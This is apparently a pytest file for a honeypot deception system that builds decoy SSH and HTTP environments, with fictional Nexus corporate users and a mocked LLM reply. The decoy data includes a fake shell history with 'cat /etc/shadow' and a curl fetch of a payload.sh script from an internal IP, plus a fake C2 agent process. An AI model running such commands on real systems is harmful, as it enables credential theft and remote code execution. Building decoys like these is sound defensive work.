import os
import json
import shutil
import tempfile
import pytest
from pathlib import Path
from unittest.mock import MagicMock

from agents.deception import DecoyManager
from honeypot.ssh_decoy_builder import SSHDecoyBuilder
from interceptor.session_store import SessionStore


def test_populate_ssh_baseline_creates_nexus_profile():
    with tempfile.TemporaryDirectory() as tmpdir:
        decoy_mgr = DecoyManager(http_image="nginx:alpine", max_instances=1, scope="internal")
        
        decoy_mgr._populate_ssh_baseline(tmpdir)
        
        # Verify txtcmds exist across directories
        assert os.path.isfile(os.path.join(tmpdir, "txtcmds", "ps"))
        assert os.path.isfile(os.path.join(tmpdir, "txtcmds", "bin", "ps"))
        assert os.path.isfile(os.path.join(tmpdir, "txtcmds", "usr/bin", "ps"))
        assert os.path.isfile(os.path.join(tmpdir, "txtcmds", "bin", "whoami"))
        assert os.path.isfile(os.path.join(tmpdir, "txtcmds", "bin", "netstat"))

        # Verify content matches Nexus corporate infrastructure
        with open(os.path.join(tmpdir, "txtcmds", "bin", "ps")) as f:
            content = f.read()
            assert "k8s-sync-agent" in content
            assert "marcus.vance" in content

        # Verify honeyfs
        assert os.path.isfile(os.path.join(tmpdir, "honeyfs", "etc", "passwd"))
        assert os.path.isfile(os.path.join(tmpdir, "honeyfs", "etc", "hosts"))
        assert os.path.isfile(os.path.join(tmpdir, "honeyfs", "etc", "hostname"))
        assert os.path.isfile(os.path.join(tmpdir, "honeyfs", "home", "admin", ".bash_history"))

        with open(os.path.join(tmpdir, "honeyfs", "etc", "passwd")) as f:
            passwd = f.read()
            assert "marcus.vance" in passwd
            assert "sarah.chen" in passwd

        with open(os.path.join(tmpdir, "honeyfs", "etc", "hostname")) as f:
            assert "corp-bastion-01" in f.read()


def test_populate_http_baseline_dual_perimeter():
    with tempfile.TemporaryDirectory() as tmpdir_ext:
        with tempfile.TemporaryDirectory() as tmpdir_int:
            # External manager
            mgr_ext = DecoyManager(http_image="nginx:alpine", max_instances=1, scope="external")
            mgr_ext._populate_http_baseline(tmpdir_ext)
            
            # Internal manager
            mgr_int = DecoyManager(http_image="nginx:alpine", max_instances=1, scope="internal")
            mgr_int._populate_http_baseline(tmpdir_int)
            
            # External has index, login, docs
            assert os.path.isfile(os.path.join(tmpdir_ext, "index.html"))
            assert os.path.isfile(os.path.join(tmpdir_ext, "login.html"))
            assert os.path.isfile(os.path.join(tmpdir_ext, "docs.html"))

            # Internal has index, workspace
            assert os.path.isfile(os.path.join(tmpdir_int, "index.html"))
            assert os.path.isfile(os.path.join(tmpdir_int, "workspace.html"))


@pytest.mark.asyncio
async def test_ssh_decoy_builder_live_mutations_across_subdirs():
    with tempfile.TemporaryDirectory() as tmpdir:
        config = {
            "llm": {"provider": "gemini", "api_key": "test_key"},
            "gemini": {"api_key": "test_key"}
        }
        store = MagicMock(spec=SessionStore)
        builder = SSHDecoyBuilder(config=config, store=store)
        
        # Override router to avoid remote API call in unit test
        async def fake_gen(**kwargs):
            return json.dumps({
                "whoami": "root\n",
                "id": "uid=0(root) gid=0(root)\n",
                "uname": "Linux corp-bastion-01 5.15.0-105-generic\n",
                "ps": "root 1 0 init\nroot 999 1 python-c2-agent\n",
                "df": "/dev/sda1 100G 90G 10G 90% /\n",
                "netstat": "tcp 0.0.0.0:4444 LISTEN\n",
                "passwd": "root:x:0:0:root:/root:/bin/bash\n",
                "shadow": "root:*:19800:0:99999:7:::\n",
                "hosts": "127.0.0.1 localhost corp-bastion-01\n",
                "bash_history": "cat /etc/shadow\ncurl -s http://10.0.0.9/payload.sh\n"
            })
        builder.router.generate = fake_gen
        
        decision = {"label": "Downloader", "confidence": 0.95}
        await builder.prepare_decoy_files(
            session_id="test_sess",
            decision=decision,
            cowrie_base_dir=tmpdir,
            container_id="c_123",
            decoys_manager=None
        )
        
        # Verify txtcmds exist across all subdirs
        for sub in ["", "bin", "usr/bin", "sbin"]:
            p = os.path.join(tmpdir, "txtcmds", sub, "ps") if sub else os.path.join(tmpdir, "txtcmds", "ps")
            assert os.path.isfile(p)
            with open(p) as f:
                assert "python-c2-agent" in f.read()

        # Verify honeyfs history in both admin and root
        with open(os.path.join(tmpdir, "honeyfs", "home", "admin", ".bash_history")) as f:
            assert "payload.sh" in f.read()
        with open(os.path.join(tmpdir, "honeyfs", "root", ".bash_history")) as f:
            assert "payload.sh" in f.read()
